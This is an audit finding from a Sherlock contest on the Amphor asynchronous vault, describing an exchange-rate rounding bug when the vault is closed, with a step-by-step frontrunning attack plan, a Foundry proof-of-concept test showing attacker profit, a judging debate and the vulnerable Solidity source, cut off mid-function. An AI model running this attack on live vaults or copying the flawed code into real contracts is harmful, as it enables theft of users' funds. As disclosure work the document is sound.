{
  "Title": "H-3: Exchange rate is calculated incorrectly when the vault is closed, potentially leading to funds being stolen",
  "Content": "# Issue H-3: Exchange rate is calculated incorrectly when the vault is closed, potentially leading to funds being stolen \n\nSource: https://github.com/sherlock-audit/2024-03-amphor-judging/issues/131 \n\n## Found by \nDarinrikusham, fugazzi, whitehair0330, zzykxx\n## Summary\nThe exchange ratio between shares and assets is calculated incorrectly when the vault is closed. This can cause accounting inconsistencies, funds being stolen and users being unable to redeem shares.\n\n## Vulnerability Detail\nThe functions [AsyncSynthVault::_convertToAssets](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L907-L908) and [AsyncSynthVault::_convertToShares](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L887-L890) both add `1` to the epoch cached variables `totalAssetsSnapshotForDeposit`, `totalSupplySnapshotForDeposit`, `totalAssetsSnapshotForRedeem` and `totalSupplySnapshotForRedeem`. \n\nThis is incorrect because the function [previewSettle](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L626), used in [_settle()](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L786), already adds `1` to the variables:\n```solidity\n...\nuint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;\nuint256 totalSupplySnapshotForDeposit = totalSupply + 1;\n...\nuint256 totalAssetsSnapshotForRedeem = _lastSavedBalance + pendingDeposit + 1;\nuint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;\n...\n```\n\nThis leads to accounting inconsistencies between depositing/redeeming when a vault is closed and depositing/redeeming when a vault is open whenever the exchange ratio assets/shares is not exactly 1:1.\n\nIf a share is worth more than one asset:\n- Users that will request a deposit while the vault is closed will receive **more** shares than they should\n- Users that will request a redeem while the vault is closed will receive **less** assets than they should\n\n### POC\nThis can be taken advantage of by an attacker by doing the following:\n1. The attacker monitors the mempool for a vault deployment.\n2. Before the vault is deployed the attacker transfers to the vault some of the vault underlying asset (donation). This increases the value of one share.\n3. The protocol team initializes the vault and adds the bootstrap liquidity.\n4. Users use the protocol normally and deposits some assets.\n5. The vault gets closed by the protocol team and the funds invested.\n6. Some users request a deposit while the vault is closed.\n7. The attacker monitors the mempool to know when the vault will be open again.\n8. Right before the vault is opened, the attacker performs multiple deposit requests with different accounts. For each account he deposits the minimum amount of assets required to receive 1 share.\n9. The vault opens.\n10. The attacker claims all of the deposits with every account and then redeems the shares immediately for profit.\n\nThis will \"steal\" shares of other users (point `6`) from the claimable silo because the protocol will give the attacker more shares than it should. The attacker will profit and some users won't be able to claim their shares.\n\nAdd imports to `TestClaimRedeem.t.sol`:\n```solidity\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\nand copy-paste:\n```solidity\nfunction test_attackerProfitsViaRequestingDeposits() external {\n    address attacker = makeAddr(\"attacker\");\n    address protocolUsers = makeAddr(\"alice\");\n    address vaultOwner = vaultTested.owner();\n\n    uint256 donation = 1e18 - 1;\n    uint256 protocolUsersDeposit = 10e18 + 15e18;\n    uint256 protocolTeamBootstrapDeposit = 1e18;\n\n    IERC20 asset = IERC20(vaultTested.asset());\n    deal(address(asset), protocolUsers, protocolUsersDeposit);\n    deal(address(asset), attacker, donation);\n    deal(address(asset), vaultOwner, protocolTeamBootstrapDeposit);\n\n    vm.prank(vaultOwner);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(protocolUsers);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(attacker);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    //-> Attacker donates `1e18 - 1` assets, this can be done before the vault is even deployed\n    vm.prank(attacker);\n    asset.transfer(address(vaultTested), donation);\n\n    //-> Protocol team bootstraps the vault with `1e18` of assets\n    vm.prank(vaultOwner);\n    vaultTested.deposit(protocolTeamBootstrapDeposit, vaultOwner);\n    \n    //-> Users deposit `10e18` of liquidity in the vault\n    vm.prank(protocolUsers);\n    vaultTested.deposit(10e18, protocolUsers);\n\n    //-> Vault gets closed\n    vm.prank(vaultOwner);\n    vaultTested.close();\n\n    //-> Users request deposits for `15e18` assets\n    vm.prank(protocolUsers);\n    vaultTested.requestDeposit(15e18, protocolUsers, protocolUsers, \"\");\n\n    //-> The attacker frontruns the call to `open()` and knows that:\n    //- The current epoch cached `totalSupply` of shares will be `vaultTested.totalSupply()` + 1 + 1\n    //- The current epoch cached `totalAssets` will be 12e18 + 1 + 1\n    uint256 totalSupplyCachedOnOpen = vaultTested.totalSupply() + 1 + 1; //Current supply of shares, plus 1 used as virtual share, plus 1 added by `_convertToAssets`\n    uint256 totalAssetsCachedOnOpen = vaultTested.lastSavedBalance() + 1 + 1; //Total assets passed as paremeter to `open`, plus 1 used as virtual share, plus 1 added by `_convertToAssets`\n    uint256 minToDepositToGetOneShare = totalAssetsCachedOnOpen / totalSupplyCachedOnOpen;\n\n    //-> Attacker frontruns the call to `open()` by requesting a deposit with multiple fresh accounts\n    uint256 totalDeposited = 0;\n    for(uint256 i = 0; i < 30; i++) {\n        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones\n        deal(address(asset), attackerEOA, minToDepositToGetOneShare);\n        vm.startPrank(attackerEOA);\n        asset.approve(address(vaultTested), type(uint256).max);\n        vaultTested.requestDeposit(minToDepositToGetOneShare, attackerEOA, attackerEOA, \"\");\n        vm.stopPrank();\n        totalDeposited += minToDepositToGetOneShare;\n    }\n\n    //->Vault gets opened again with 0 profit and 0 losses (for simplicity)\n    vm.startPrank(vaultOwner);\n    vaultTested.open(vaultTested.lastSavedBalance());\n    vm.stopPrank();\n\n    //-> Attacker claims his deposits and withdraws them immediately for profit\n    uint256 totalRedeemed = 0;\n    for(uint256 i = 0; i < 30; i++) {\n        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones\n        vm.startPrank(attackerEOA);\n        vaultTested.claimDeposit(attackerEOA);\n        uint256 assets = vaultTested.redeem(vaultTested.balanceOf(attackerEOA), attackerEOA, attackerEOA);\n        vm.stopPrank();\n        totalRedeemed += assets;\n    }\n\n    //->❌ Attacker is in profit\n    assertGt(totalRedeemed, totalDeposited + donation);\n}\n```\n\n## Impact\nWhen the ratio between shares and assets is not 1:1 the protocol calculates the exchange rate between assets and shares inconsitently. This is an issue by itself and can lead to loss of funds and users not being able to claim shares. It can also be taken advantage of by an attacker to steal shares from the claimable silo.\n\nNote that the \"donation\" done initially is not akin to an \"inflation\" attack because the attacker is not required to mint any share.\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\nIn the functions [AsyncSynthVault::_convertToAssets](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L907-L908) and [AsyncSynthVault::_convertToShares](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L887-L890):\n- Return `0` if `requestId == 0`\n- Don't add `1` to the two cached variables\n\nIt's also a good idea to perform the initial bootstrapping deposit in the [initialize](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L181) function (as suggested in another finding) and require that the vault contains `0` assets when the first deposit is performed.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/104.\n\n**0xLogos**\n\nEscalate \n\nLow (at least medium)\n\nI doubt that there's any profit\n+1 even in 6 dp is too small \nfrontrunning and gas on mainnet too expensive, not possible on polygon zkevm \n\n**sherlock-admin2**\n\n> Escalate \n> \n> Low (at least medium)\n> \n> I doubt that there's any profit\n> +1 even in 6 dp is too small \n> frontrunning and gas on mainnet too expensive, not possible on polygon zkevm \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**realfugazzi**\n\n> Escalate\n> \n> Low (at least medium)\n> \n> I doubt that there's any profit +1 even in 6 dp is too small frontrunning and gas on mainnet too expensive, not possible on polygon zkevm\n\nTake into account that this issue is not just about small differences of amounts in calculations, but could break redemptions accidentally since the amounts are off and eventually people cannot claim back their intents. #73 goes into this and offers a detailed PoC.\n\n**0xLogos**\n\nI see, but it's not permanent lock of funds thus not loss of funds so I think medium is apropriate severity.\n\n**WangSecurity**\n\nThe reason why we decided to make it high severity, cause it's a normal workflow to open/close the vault, therefore, there are no certain external conditions for this, it will just happen even if the protocol operates in a normal way.\n\nSo the absence of any external factors is the reason it's high. Both LSW and the sponsor agreed on it.\n\n**0xLogos**\n\n<img width=\"761\" alt=\"image\" src=\"https://github.com/sherlock-audit/2024-03-amphor-judging/assets/152320849/fda0a200-476c-4c40-badb-9c7694a1e454\">\n\nI believe only \"core functionality break\" apropriate here according to rules.\n\n(About #73) Admins can easily recover funds by close vault => request dust amount => settle => silo now has enough shares.\n\n**Mihir018**\n\nI agree with @WangSecurity and I also concerned with @blablalf regarding if this is a normal flow of operation during contest and they agreed on that. And it would also result in definite loss of funds without external conditions due to calculation flow implemented.\n\n**WangSecurity**\n\nI see the point that 0xLogos raises here, but I still believe it should remain high, cause the users would lose funds due to just interacting with the protocol, nothing else is required, it's just the normal workflow, therefore, I think it should be high.\n\n**Evert0x**\n\nIt looks like we agree that core functionality is being broken, but there is a disagreement if that would result in lost funds. \n\n@0xLogos \n\n> Take into account that this issue is not just about small differences of amounts in calculations, but could break redemptions accidentally since the amounts are off and eventually people cannot claim back their intents. \n\nDoes this argument convince you that this issue can result in lost funds?\n\n**zzykxx**\n\nThe POC I coded proves funds can be stolen by abusing an implementation mistake that leads to a rounding error in favor of users.\n\nThis issue should be judged high severity for consistency given that this [one](https://github.com/sherlock-audit/2023-12-jojo-exchange-update-judging/issues/57) (which has the same pre-conditions, with the exception that in this case the admin doesn't have to approve every single withdrawal) has been judged as high severity.\n\n**Evert0x**\n\nPlanning to reject escalation and keep issue state as is\n\n**0xLogos**\n\n```\n//->❌ Attacker is in profit\nassertGt(totalRedeemed, totalDeposited + donation);\n```\n\nWhat is exact profit in this case? If it greater by 1 wei or so loss of funds doesn't make sense here\n\n**0xLogos**\n\n> Does this argument convince you that this issue can result in lost funds?\n\nNo, as I said, its not permanent loss, it could be easily recovered by admin or accidentely. Also I think \"normal workflow\" wording can lead to misunderstanding here: PoC has certain hardcoded numbers and it can be simply edge case.\n\n**realfugazzi**\n\n> > Does this argument convince you that this issue can result in lost funds?\n> \n> No, as I said, its not permanent loss, it could be easily recovered by admin or accidentely. Also I think \"normal workflow\" wording can lead to misunderstanding here: PoC has certain hardcoded numbers and it can be simply edge case.\n\nThen it is a loss for the admins, moving the loss from one entity to another doesn't take away the loss.\n\nImagine there is a protocol that gets hacked, and the funds are returned back to their rightful owners via the protocol treasury, wouldn't you classify this as a loss?\n\n**zzykxx**\n\nI will just say 3 things:\n1. The POC shows the profit for the attacker is 1.69ETH\n2. The POC shows the funds are in the attacker wallet and cannot be recovered\n3. People should at least run the POC before escalating\n\n**Evert0x**\n\nStill planning to reject escalation and keep issue state as is. The escalation and follow up comments fail to provide a detailed reason to invalidate the issue. \n\n**Evert0x**\n\nResult:\nHigh \nHas Duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xLogos](https://github.com/sherlock-audit/2024-03-amphor-judging/issues/131/#issuecomment-2025396949): rejected\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/244",
  "Code": [
    {
      "filename": "asynchronous-vault/src/AsyncSynthVault.sol",
      "content": "//SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport {\n    IERC7540,\n    IERC165,\n    IERC7540Redeem,\n    IERC7540Deposit\n} from \"./interfaces/IERC7540.sol\";\nimport { ERC7540Receiver } from \"./interfaces/ERC7540Receiver.sol\";\nimport { IERC20, SafeERC20, Math, PermitParams } from \"./SyncSynthVault.sol\";\n\nimport { SyncSynthVault } from \"./SyncSynthVault.sol\";\n\n/**\n *         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@%=::::::=%@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@*=#=--=*=*@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:*=    =#:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:@@    @@:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:@@    @@:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:@@    @@:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@*-.    .-*@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@*        *@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@.         .@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@*  Amphor  *@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@*==========#@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@+==========*@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@*   ASync   *@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@%  Vault  %@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@=        +@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@%       %@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@=      =@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@%     .@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@@=    =@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@@%----%@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@%+:::::+%@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@########@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n *\n *            d8888                        888\n *           d88888                        888\n *          d88P888                        888\n *         d88P 888 88888b.d88b.  88888b.  88888b.   .d88b.  888d888\n *        d88P  888 888 \"888 \"88b 888 \"88b 888 \"88b d88\"\"88b 888P\"\n *       d88P   888 888  888  888 888  888 888  888 888  888 888\n *      d8888888888 888  888  888 888 d88P 888  888 Y88..88P 888\n *     d88P     888 888  888  888 88888P\"  888  888  \"Y88P\"  888.io\n *                                888\n *                                888\n *                                888\n */\n\n/*\n * ########\n * # LIBS #\n * ########\n*/\nusing Math for uint256; // only used for `mulDiv` operations.\nusing SafeERC20 for IERC20; // `safeTransfer` and `safeTransferFrom`\n\n/*\n    This structure contains all the informations needed to let user claim their\n    request after we processed those. To avoid rounding errors we store the\ntotalSupply and totalAssets at the time of the deposit/redeem for the deposit\nand\n    the redeem. We also store the amount of assets and shares given by the user.*/\nstruct EpochData {\n    uint256 totalSupplySnapshotForRedeem;\n    uint256 totalAssetsSnapshotForRedeem;\n    uint256 totalSupplySnapshotForDeposit;\n    uint256 totalAssetsSnapshotForDeposit;\n    mapping(address => uint256) depositRequestBalance;\n    mapping(address => uint256) redeemRequestBalance;\n}\n\nstruct SettleValues {\n    uint256 lastSavedBalance;\n    uint256 fees;\n    uint256 pendingRedeem;\n    uint256 sharesToMint;\n    uint256 pendingDeposit;\n    uint256 assetsToWithdraw;\n    uint256 totalAssetsSnapshotForDeposit;\n    uint256 totalSupplySnapshotForDeposit;\n    uint256 totalAssetsSnapshotForRedeem;\n    uint256 totalSupplySnapshotForRedeem;\n}\n\nuint256 constant BPS_DIVIDER = 10_000;\nuint16 constant MAX_FEES = 3000; // 30%\n\ncontract Silo {\n    constructor(IERC20 underlying) {\n        underlying.forceApprove(msg.sender, type(uint256).max);\n    }\n}\n\ncontract AsyncSynthVault is IERC7540, SyncSynthVault {\n    /*\n     * ####################################\n     * # AMPHOR SYNTHETIC RELATED STORAGE #\n     * ####################################\n    */\n\n    // @return Amount of the perf fees applied on the positive yield.\n    uint256 public epochId;\n    Silo public pendingSilo; // to manage the pending deposits and redeems we\n        // store them in a contract whose function is to hold the assets/shares.\n    Silo public claimableSilo; // to manage the claimable deposits and redeems\n        // we\n        // store them in a contract whose function is to hold the assets/shares.\n    mapping(uint256 epochId => EpochData epoch) public epochs;\n    mapping(address user => uint256 epochId) public lastDepositRequestId;\n    mapping(address user => uint256 epochId) public lastRedeemRequestId;\n\n    /*\n     * ##########\n     * # EVENTS #\n     * ##########\n    */\n\n    event DecreaseDepositRequest(\n        uint256 indexed requestId,\n        address indexed owner,\n        uint256 indexed previousRequestedAssets,\n        uint256 newRequestedAssets\n    );\n\n    event DecreaseRedeemRequest(\n        uint256 indexed requestId,\n        address indexed owner,\n        uint256 indexed previousRequestedShares,\n        uint256 newRequestedShares\n    );\n\n    event ClaimDeposit(\n        uint256 indexed requestId,\n        address indexed owner,\n        address indexed receiver,\n        uint256 assets,\n        uint256 shares\n    );\n\n    event ClaimRedeem(\n        uint256 indexed requestId,\n        address indexed owner,\n        address indexed receiver,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /*\n     * ##########\n     * # ERRORS #\n     * ##########\n     */\n    error ExceededMaxRedeemRequest(\n        address receiver, uint256 shares, uint256 maxShares\n    );\n    error ExceededMaxDepositRequest(\n        address receiver, uint256 assets, uint256 maxDeposit\n    );\n    error MustClaimFirst(address owner);\n\n    error ReceiverFailed();\n    error NotOwner();\n    error NullRequest();\n    error ERC7540CantRequestDepositOnBehalfOf();\n    /*\n     * ##############################\n     * # AMPHOR SYNTHETIC FUNCTIONS #\n     * ##############################\n     */\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() SyncSynthVault() {\n        //_disableInitializers();\n    }\n\n    function initialize(\n        uint16 fees,\n        address owner,\n        IERC20 underlying,\n        string memory name,\n        string memory symbol\n    )\n        public\n        virtual\n        override\n        initializer\n    {\n        super.initialize(fees, owner, underlying, name, symbol);\n        epochId = 1;\n        pendingSilo = new Silo(underlying);\n        claimableSilo = new Silo(underlying);\n    }\n\n    /*\n    Since we only allow one claimable request at a time, users must claim\n        their request before making a new one. This function let users claim\n        and request a deposit in one transaction.\n    */\n    function claimAndRequestDeposit(\n        uint256 assets,\n        address receiver,\n        bytes memory data\n    )\n        external\n    {\n        _claimDeposit(receiver, receiver);\n        requestDeposit(assets, receiver, _msgSender(), data);\n    }\n\n    /*\n        Same logic as `claimAndRequestDeposit` but for redeem requests.\n    */\n    function claimAndRequestRedeem(\n        uint256 shares,\n        bytes memory data\n    )\n        external\n    {\n        address owner = _msgSender();\n        _claimRedeem(owner, owner);\n        requestRedeem(shares, owner, owner, data);\n    }\n\n    /*\n    This function is used to decrease the amount of assets requested to deposit\n    by the\n        user. It can only be called by the user who made the request.\n    */\n    function decreaseDepositRequest(uint256 assets)\n        external\n        whenClosed\n        whenNotPaused\n    {\n        address owner = _msgSender();\n        uint256 oldBalance = epochs[epochId].depositRequestBalance[owner];\n        epochs[epochId].depositRequestBalance[owner] -= assets;\n        _asset.safeTransferFrom(address(pendingSilo), owner, assets);\n\n        emit DecreaseDepositRequest(\n            epochId,\n            owner,\n            oldBalance,\n            epochs[epochId].depositRequestBalance[owner]\n        );\n    }\n\n    /*\n    This function is used to decrease the amount of shares requested to redeem\n    by the\n        user. It can only be called by the user who made the request.\n    */\n    function decreaseRedeemRequest(uint256 shares)\n        external\n        whenClosed\n        whenNotPaused\n    {\n        address owner = _msgSender();\n        uint256 oldBalance = epochs[epochId].redeemRequestBalance[owner];\n        epochs[epochId].redeemRequestBalance[owner] -= shares;\n        _update(address(pendingSilo), owner, shares);\n\n        emit DecreaseRedeemRequest(\n            epochId,\n            owner,\n            oldBalance,\n            epochs[epochId].redeemRequestBalance[owner]\n        );\n    }\n\n    /*\n     * ######################################\n     * # AMPHOR SYNTHETIC RELATED FUNCTIONS #\n     * ######################################\n    */\n\n    /**\n     * @dev The `close` function is used to close the vault.\n     * It can only be called by the owner of the contract (`onlyOwner`\n     * modifier).\n     */\n    function close() external override onlyOwner {\n        if (!vaultIsOpen) revert VaultIsClosed();\n\n        if (totalAssets() == 0) revert VaultIsEmpty();\n\n        lastSavedBalance = totalAssets();\n        vaultIsOpen = false;\n        _asset.safeTransfer(owner(), lastSavedBalance);\n        emit EpochStart(block.timestamp, lastSavedBalance, totalSupply());\n    }\n\n    /**\n     * @dev The `open` function is used to open the vault.\n     * @notice The `open` function is used to end the lock period of the vault.\n     * It can only be called by the owner of the contract (`onlyOwner` modifier)\n     * and only when the vault is locked.\n     * If there are profits, the performance fees are taken and sent to the\n     * owner of the contract.\n     * @param assetReturned The underlying assets amount to be deposited into\n     * the vault.\n     */\n    function open(uint256 assetReturned)\n        external\n        override\n        onlyOwner\n        whenNotPaused\n        whenClosed\n    {\n        (uint256 newBalance,) = _settle(assetReturned);\n        vaultIsOpen = true;\n        _asset.safeTransferFrom(owner(), address(this), newBalance);\n    }\n\n    /*\n     * #################################\n     * #   Permit RELATED FUNCTIONS    #\n     * #################################\n    */\n\n    /* This function is used to claim the pending deposit and request a new one\n    in one transaction using permit signatures */\n    function claimAndRequestDepositWithPermit(\n        uint256 assets,\n        bytes memory data,\n        PermitParams calldata permitParams\n    )\n        external\n    {\n        address msgSender = _msgSender();\n        _claimDeposit(msgSender, msgSender);\n        requestDepositWithPermit(assets, msgSender, data, permitParams);\n    }\n\n    /*\n    Since amphor strategies can be time sensitive, we must be able to switch\n    epoch without needing\n    to put all the funds back. Using _settle we can virtually put back the\n    funds, check how much we owe\n    to users that want to redeem and maybe take the extra funds from the deposit\n    requests.\n    \n    */\n    function settle(uint256 newSavedBalance) external {\n        (uint256 lastSavedBalance, uint256 totalSupply) =\n            _settle(newSavedBalance);\n        lastSavedBalance = 0;\n        emit EpochStart(block.timestamp, lastSavedBalance, totalSupply);\n    }\n\n    /**\n     * @dev How many shares a users currently has waiting to be redeem.\n     *\n     */\n    function pendingRedeemRequest(address owner)\n        external\n        view\n        returns (uint256)\n    {\n        return epochs[epochId].redeemRequestBalance[owner];\n    }\n\n    /**\n     * @dev How many shares are  virtually waiting for the user to be redeemed\n     * via\n     * the `claimRedeem` function.\n     */\n    function claimableRedeemRequest(address owner)\n        external\n        view\n        returns (uint256)\n    {\n        uint256 lastRequestId = lastRedeemRequestId[owner];\n        return isCurrentEpoch(lastRequestId)\n            ? 0\n            : epochs[lastRequestId].redeemRequestBalance[owner];\n    }\n\n    /**\n     * @dev How many assets are currently waiting to be deposited for the user.\n     */\n    function pendingDepositRequest(address owner)\n        external\n        view\n        returns (uint256 assets)\n    {\n        return epochs[epochId].depositRequestBalance[owner];\n    }\n\n    /**\n     * @dev How many assets are virtually waiting for the user to be deposit\n     * via the `claimDeposit` function.\n     */\n    function claimableDepositRequest(address owner)\n        external\n        view\n        returns (uint256 assets)\n    {\n        uint256 lastRequestId = lastDepositRequestId[owner];\n        return isCurrentEpoch(lastRequestId)\n            ? 0\n            : epochs[lastRequestId].depositRequestBalance[owner];\n    }\n\n    /**\n     * @dev How many assets are currently waiting to be deposited for all users.\n     */\n    function totalPendingDeposits() external view returns (uint256) {\n        return vaultIsOpen ? 0 : _asset.balanceOf(address(pendingSilo));\n    }\n\n    /**\n     * @dev How many shares are  waiting to be redeemed for all users.\n     */\n    function totalPendingRedeems() external view returns (uint256) {\n        return vaultIsOpen ? 0 : balanceOf(address(pendingSilo));\n    }\n\n    function totalClaimableShares() external view returns (uint256) {\n        return balanceOf(address(claimableSilo));\n    }\n\n    function totalClaimableAssets() external view returns (uint256) {\n        return _asset.balanceOf(address(claimableSilo));\n    }\n\n    /**\n     * @dev when the vault is closed, users can only request to deposit.\n     * By doing this funds will be sent and wait in the pendingSilo.\n     * When the owner will call the `open` or `settle` function, the funds will\n     * be\n     * deposited and the minted shares will be sent to the claimableSilo. Waiting\n     * for the users to claim them.\n     */\n    function requestDeposit(\n        uint256 assets,\n        address receiver,\n        address owner,\n        bytes memory data\n    )\n        public\n        whenNotPaused\n        whenClosed\n    {\n        // vault\n        if (_msgSender() != owner) {\n            revert ERC7540CantRequestDepositOnBehalfOf();\n        }\n        if (previewClaimDeposit(receiver) > 0) {\n            revert MustClaimFirst(receiver);\n        }\n\n        if (assets > maxDepositRequest(owner)) {\n            revert ExceededMaxDepositRequest(\n                receiver, assets, maxDepositRequest(owner)\n            );\n        }\n\n        _asset.safeTransferFrom(owner, address(pendingSilo), assets);\n\n        _createDepositRequest(assets, receiver, owner, data);\n    }\n\n    /**\n     * @dev when the vault is closed, users can only request to redeem.\n     * By doing this shares will be sent and wait in the pendingSilo.\n     * When the owner will call the `open` or `settle` function, the shares will\n     * be\n     * redeemed and the assets will be sent to the claimableSilo. Waiting for\n     * the\n     * users to claim them.\n     */\n    function requestRedeem(\n        uint256 shares,\n        address receiver,\n        address owner,\n        bytes memory data\n    )\n        public\n        whenNotPaused\n        whenClosed\n    {\n        if (_msgSender() != owner) {\n            _spendAllowance(owner, _msgSender(), shares);\n        }\n        if (previewClaimRedeem(receiver) > 0) {\n            revert MustClaimFirst(receiver);\n        }\n        if (shares > maxRedeemRequest(owner)) {\n            revert ExceededMaxRedeemRequest(\n                receiver, shares, maxRedeemRequest(owner)\n            );\n        }\n\n        _update(owner, address(pendingSilo), shares);\n        // Create a new request\n        _createRedeemRequest(shares, receiver, owner, data);\n    }\n\n    /**\n     * @dev This function let users claim the shares we owe them after we\n     * processed their deposit request, in the _settle function.\n     */\n    function claimDeposit(address receiver)\n        public\n        whenNotPaused\n        returns (uint256 shares)\n    {\n        return _claimDeposit(_msgSender(), receiver);\n    }\n\n    /**\n     *\n     * @dev This function let users claim the assets we owe them after we\n     * processed their redeem request, in the _settle function.\n     */\n    function claimRedeem(address receiver)\n        public\n        whenNotPaused\n        returns (uint256 assets)\n    {\n        return _claimRedeem(_msgSender(), receiver);\n    }\n\n    /**\n     * @dev This funciton let user request a deposit using permit signatures.\n     */\n    function requestDepositWithPermit(\n        uint256 assets,\n        address receiver,\n        bytes memory data,\n        PermitParams calldata permitParams\n    )\n        public\n    {\n        address msgSender = _msgSender();\n        if (_asset.allowance(msgSender, address(this)) < assets) {\n            execPermit(msgSender, address(this), permitParams);\n        }\n        return requestDeposit(assets, receiver, msgSender, data);\n    }\n\n    /**\n     * @dev users can request deposit only when the vault is closed and not\n     * paused.\n     */\n    function maxDepositRequest(address) public view returns (uint256) {\n        return vaultIsOpen || paused() ? 0 : type(uint256).max;\n    }\n\n    /**\n     * @dev users can request redeem only when the vault is closed and not\n     * paused.\n     */\n    function maxRedeemRequest(address owner) public view returns (uint256) {\n        return vaultIsOpen || paused() ? 0 : balanceOf(owner);\n    }\n\n    /**\n     * @dev This function let users preview how many shares they will get if\n     * they claim their deposit request.\n     */\n    function previewClaimDeposit(address owner) public view returns (uint256) {\n        uint256 lastRequestId = lastDepositRequestId[owner];\n        uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n        return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);\n    }\n\n    /**\n     * @dev This function let users preview how many assets they will get if\n     * they claim their redeem request.\n     */\n    function previewClaimRedeem(address owner) public view returns (uint256) {\n        uint256 lastRequestId = lastRedeemRequestId[owner];\n        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n        return _convertToAssets(shares, lastRequestId, Math.Rounding.Floor);\n    }\n\n    /**\n     */\n    function convertToShares(\n        uint256 assets,\n        uint256 _epochId\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _convertToShares(assets, _epochId, Math.Rounding.Floor);\n    }\n\n    function convertToAssets(\n        uint256 shares,\n        uint256 _epochId\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _convertToAssets(shares, _epochId, Math.Rounding.Floor);\n    }\n\n    /**\n     *\n     * Utils function to convert the shares claimable into assets. It can\n     * be used in the front end to save an rpc call.\n     */\n    function claimableDepositBalanceInAsset(address owner)\n        public\n        view\n        returns (uint256)\n    {\n        uint256 shares = previewClaimDeposit(owner);\n        return convertToAssets(shares);\n    }\n\n    /**\n     * Using this the owner can know if he will have to send money to the\n     * claimableSilo (for users who want to leave the vault) or if he will\n     * receive money from it.\n     */\n    function previewSettle(uint256 newSavedBalance)\n        public\n        view\n        returns (\n            uint256 assetsToOwner,\n            uint256 assetsToVault,\n            SettleValues memory settleValues\n        )\n    {\n        uint256 _lastSavedBalance = lastSavedBalance;\n        _checkMaxDrawdown(_lastSavedBalance, newSavedBalance);\n\n        // calculate the fees between lastSavedBalance and newSavedBalance\n        uint256 fees = _computeFees(_lastSavedBalance, newSavedBalance);\n        uint256 totalSupply = totalSupply();\n\n        // taking fees if positive yield\n        _lastSavedBalance = newSavedBalance - fees;\n\n        address pendingSiloAddr = address(pendingSilo);\n        uint256 pendingRedeem = balanceOf(pendingSiloAddr);\n        uint256 pendingDeposit = _asset.balanceOf(pendingSiloAddr);\n\n        uint256 sharesToMint = pendingDeposit.mulDiv(\n            totalSupply + 1, _lastSavedBalance + 1, Math.Rounding.Floor\n        );\n\n        uint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;\n        uint256 totalSupplySnapshotForDeposit = totalSupply + 1;\n\n        